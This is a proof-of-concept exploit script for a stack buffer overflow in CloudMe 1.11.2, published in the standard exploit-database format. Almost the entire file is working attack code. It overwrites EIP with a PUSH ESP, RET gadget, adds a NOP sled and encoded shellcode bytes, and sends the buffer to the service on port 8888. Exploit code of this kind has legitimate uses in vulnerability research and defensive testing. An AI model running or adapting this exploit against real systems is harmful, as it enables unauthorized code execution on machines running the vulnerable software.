# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket
import sys

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

payload =  b""
payload += b"\xba\xa4\x1c\xa2\x72\xd9\xeb\xd9\x74\x24\xf4\x58\x29"
payload += b"\xc9\xb1\x52\x31\x50\x12\x83\xc0\x04\x03\xf4\x12\x40"
payload += b"\x87\x08\xc2\x06\x68\xf0\x13\x67\xe0\x15\x22\xa7\x96"
payload += b"\x5e\x15\x17\xdc\x32\x9a\xdc\xb0\xa6\x29\x90\x1c\xc9"
payload += b"\x9a\x1f\x7b\xe4\x1b\x33\xbf\x67\x98\x4e\xec\x47\xa1"
payload += b"\x80\xe1\x86\xe6\xfd\x08\xda\xbf\x8a\xbf\xca\xb4\xc7"
payload += b"\x03\x61\x86\xc6\x03\x96\x5f\xe8\x22\x09\xeb\xb3\xe4"
payload += b"\xa8\x38\xc8\xac\xb2\x5d\xf5\x67\x49\x95\x81\x79\x9b"
payload += b"\xe7\x6a\xd5\xe2\xc7\x98\x27\x23\xef\x42\x52\x5d\x13"
payload += b"\xfe\x65\x9a\x69\x24\xe3\x38\xc9\xaf\x53\xe4\xeb\x7c"
payload += b"\x05\x6f\xe7\xc9\x41\x37\xe4\xcc\x86\x4c\x10\x44\x29"
payload += b"\x82\x90\x1e\x0e\x06\xf8\xc5\x2f\x1f\xa4\xa8\x50\x7f"
payload += b"\x07\x14\xf5\xf4\xaa\x41\x84\x57\xa3\xa6\xa5\x67\x33"
payload += b"\xa1\xbe\x14\x01\x6e\x15\xb2\x29\xe7\xb3\x45\x4d\xd2"
payload += b"\x04\xd9\xb0\xdd\x74\xf0\x76\x89\x24\x6a\x5e\xb2\xae"
payload += b"\x6a\x5f\x67\x60\x3a\xcf\xd8\xc1\xea\xaf\x88\xa9\xe0"
payload += b"\x3f\xf6\xca\x0b\xea\x9f\x61\xf6\x7d\xaa\x7f\xf6\xf8"
payload += b"\xc2\x7d\x06\x12\x4e\x0b\xe0\x7e\x60\x5d\xbb\x16\x19"
payload += b"\xc4\x37\x86\xe6\xd2\x32\x88\x6d\xd1\xc3\x47\x86\x9c"
payload += b"\xd7\x30\x66\xeb\x85\x97\x79\xc1\xa1\x74\xeb\x8e\x31"
payload += b"\xf2\x10\x19\x66\x53\xe6\x50\xe2\x49\x51\xcb\x10\x90"
payload += b"\x07\x34\x90\x4f\xf4\xbb\x19\x1d\x40\x98\x09\xdb\x49"
payload += b"\xa4\x7d\xb3\x1f\x72\x2b\x75\xf6\x34\x85\x2f\xa5\x9e"
payload += b"\x41\xa9\x85\x20\x17\xb6\xc3\xd6\xf7\x07\xba\xae\x08"
payload += b"\xa7\x2a\x27\x71\xd5\xca\xc8\xa8\x5d\xea\x2a\x78\xa8"
payload += b"\x83\xf2\xe9\x11\xce\x04\xc4\x56\xf7\x86\xec\x26\x0c"
payload += b"\x96\x85\x23\x48\x10\x76\x5e\xc1\xf5\x78\xcd\xe2\xdf"

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))

buf = padding1 + EIP + NOPS + payload + overrun

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buf)
except Exception as e:
	print(sys.exc_value)
